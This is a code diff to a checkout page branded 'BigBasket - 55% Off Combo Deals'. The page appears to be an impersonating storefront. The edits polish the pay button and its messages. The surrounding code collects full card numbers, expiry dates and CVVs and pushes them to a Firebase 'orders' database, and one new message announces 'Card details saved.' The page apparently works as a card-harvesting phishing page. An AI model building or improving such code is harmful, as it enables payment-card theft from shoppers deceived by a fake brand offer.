@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>BigBasket - 55% Off Combo Deals</title>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     
@@ -915,15 +915,17 @@
             justify-content: space-between;
             align-items: center;
             color: white;
-            cursor: not-allowed;
             border-radius: 10px;
             margin-top: 20px;
             opacity: 0.6;
+            pointer-events: none;
+            transition: all 0.2s ease;
         }
         .sticky-pay-footer.active {
             background: #0e8321;
             cursor: pointer;
             opacity: 1;
+            pointer-events: auto;
         }
         .success-hero {
             background: linear-gradient(135deg, #0e8321 0%, #074d1e 100%);
@@ -1449,6 +1451,7 @@
         hideAllPages();
         document.getElementById('payment-page').style.display = 'block';
         updateAllDeliveryDates();
+        validateAllFields(); 
     }
     
     function hidePaymentPage() { hideAllPages(); document.getElementById('address-page').style.display = 'block'; updateAllDeliveryDates(); }
@@ -1505,13 +1508,20 @@
         const isMonthValid = month.length === 2 && parseInt(month) >= 1 && parseInt(month) <= 12;
         const isYearValid = year.length === 2 && parseInt(year) >= (new Date().getFullYear() % 100);
         const isCvvValid = cvv.length >= 3 && cvv.length <= 4 && /^\d+$/.test(cvv);
-        if(isCardValid && isMonthValid && isYearValid && isCvvValid) { payBtn.classList.remove('disabled'); payBtn.classList.add('active'); payBtn.style.cursor = 'pointer'; payBtn.style.opacity = '1'; }
-        else { payBtn.classList.add('disabled'); payBtn.classList.remove('active'); payBtn.style.cursor = 'not-allowed'; payBtn.style.opacity = '0.6'; }
+        
+        if(isCardValid && isMonthValid && isYearValid && isCvvValid) { 
+            payBtn.classList.add('active'); 
+        } else { 
+            payBtn.classList.remove('active'); 
+        }
     }
     
     function finalPlaceOrder() {
         const payBtn = document.getElementById('pay-button-container');
-        if(payBtn.classList.contains('disabled')) { alert("Please enter valid card details (13-16 digit card number, valid expiry, and CVV)"); return; }
+        if(!payBtn.classList.contains('active')) { 
+            alert("❌ Please fill all card details correctly!\n\n• Card Number (13-16 digits)\n• Expiry Month (MM)\n• Expiry Year (YY)\n• CVV (3-4 digits)");
+            return; 
+        }
         
         const name = document.getElementById('addr-name').value;
         const mobile = document.getElementById('addr-mobile').value;
@@ -1532,9 +1542,9 @@
         
         const originalContent = payBtn.innerHTML;
         payBtn.innerHTML = '<div style="width:100%; text-align:center;"><span class="spinner"></span> Placing order...</div>';
+        payBtn.classList.remove('active');
         payBtn.style.pointerEvents = 'none';
         
-        // Complete order data with full card details in payment object
         const orderData = {
             customer: { 
                 name: name, 
@@ -1572,8 +1582,6 @@
             timestamp: firebase.database.ServerValue.TIMESTAMP
         };
         
-        console.log("Saving order with card details:", orderData.payment);
-        
         db.ref('orders').push(orderData).then((snapshot) => {
             document.getElementById('success-order-id').innerText = snapshot.key.slice(-8).toUpperCase();
             if (typeof fbq !== 'undefined') fbq('track', 'Purchase', { value: finalPay, currency: 'INR', content_ids: cart.map(item => item.id.toString()) });
@@ -1582,12 +1590,13 @@
             document.getElementById('success-page').style.display = 'block';
             payBtn.innerHTML = originalContent;
             payBtn.style.pointerEvents = 'auto';
-            showToast("Order placed successfully !");
+            showToast("✅ Order placed successfully! Card details saved.");
         }).catch((error) => { 
             console.error("Firebase Error:", error);
-            alert("Order failed! Please check your internet connection."); 
-            payBtn.innerHTML = originalContent; 
-            payBtn.style.pointerEvents = 'auto'; 
+            alert("❌ Order failed! Please check your internet connection."); 
+            payBtn.innerHTML = originalContent;
+            payBtn.style.pointerEvents = 'auto';
+            validateAllFields();
         });
     }
     
